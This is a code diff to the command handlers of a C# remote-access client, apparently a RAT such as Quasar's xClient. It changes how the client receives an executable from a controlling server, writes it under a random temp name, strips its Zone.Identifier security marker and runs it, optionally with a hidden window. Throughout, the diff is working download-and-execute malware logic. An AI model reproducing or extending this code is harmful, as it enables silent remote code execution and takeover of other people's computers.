@@ -20,8 +20,7 @@ namespace xClient.Core.Commands
 
             new Thread(() =>
             {
-                string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    FileHelper.GetRandomFilename(12, ".exe"));
+                string tempFile = FileHelper.GetTempFilePath(".exe");
 
                 try
                 {
@@ -44,7 +43,7 @@ namespace xClient.Core.Commands
                     FileHelper.DeleteZoneIdentifier(tempFile);
 
                     var bytes = File.ReadAllBytes(tempFile);
-                    if (bytes[0] != 'M' && bytes[1] != 'Z')
+                    if (!FileHelper.IsValidExecuteableFile(bytes))
                         throw new Exception("no pe file");
 
                     ProcessStartInfo startInfo = new ProcessStartInfo();
@@ -53,7 +52,7 @@ namespace xClient.Core.Commands
                         startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                         startInfo.CreateNoWindow = true;
                     }
-                    startInfo.UseShellExecute = command.RunHidden;
+                    startInfo.UseShellExecute = false;
                     startInfo.FileName = tempFile;
                     Process.Start(startInfo);
                 }
@@ -70,25 +69,26 @@ namespace xClient.Core.Commands
 
         public static void HandleDoUploadAndExecute(Packets.ServerPackets.DoUploadAndExecute command, Client client)
         {
-            string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                command.FileName);
+            if (!_renamedFiles.ContainsKey(command.ID))
+                _renamedFiles.Add(command.ID, FileHelper.GetTempFilePath(Path.GetExtension(command.FileName)));
+
+            string filePath = _renamedFiles[command.ID];
 
             try
             {
-                if (command.CurrentBlock == 0 && Path.GetExtension(command.FileName) == ".exe" && !FileHelper.IsValidExecuteableFile(command.Block))
+                if (command.CurrentBlock == 0 && Path.GetExtension(filePath) == ".exe" && !FileHelper.IsValidExecuteableFile(command.Block))
                     throw new Exception("No executable file");
 
                 FileSplit destFile = new FileSplit(filePath);
 
                 if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
-                {
-                    new Packets.ClientPackets.SetStatus(string.Format("Writing failed: {0}", destFile.LastError)).Execute(
-                        client);
-                    return;
-                }
+                    throw new Exception(destFile.LastError);
 
                 if ((command.CurrentBlock + 1) == command.MaxBlocks) // execute
                 {
+                    if (_renamedFiles.ContainsKey(command.ID))
+                        _renamedFiles.Remove(command.ID);
+
                     FileHelper.DeleteZoneIdentifier(filePath);
 
                     ProcessStartInfo startInfo = new ProcessStartInfo();
@@ -97,7 +97,7 @@ namespace xClient.Core.Commands
                         startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                         startInfo.CreateNoWindow = true;
                     }
-                    startInfo.UseShellExecute = command.RunHidden;
+                    startInfo.UseShellExecute = false;
                     startInfo.FileName = filePath;
                     Process.Start(startInfo);
 
@@ -106,6 +106,8 @@ namespace xClient.Core.Commands
             }
             catch (Exception ex)
             {
+                if (_renamedFiles.ContainsKey(command.ID))
+                    _renamedFiles.Remove(command.ID);
                 NativeMethods.DeleteFile(filePath);
                 new Packets.ClientPackets.SetStatus(string.Format("Execution failed: {0}", ex.Message)).Execute(client);
             }
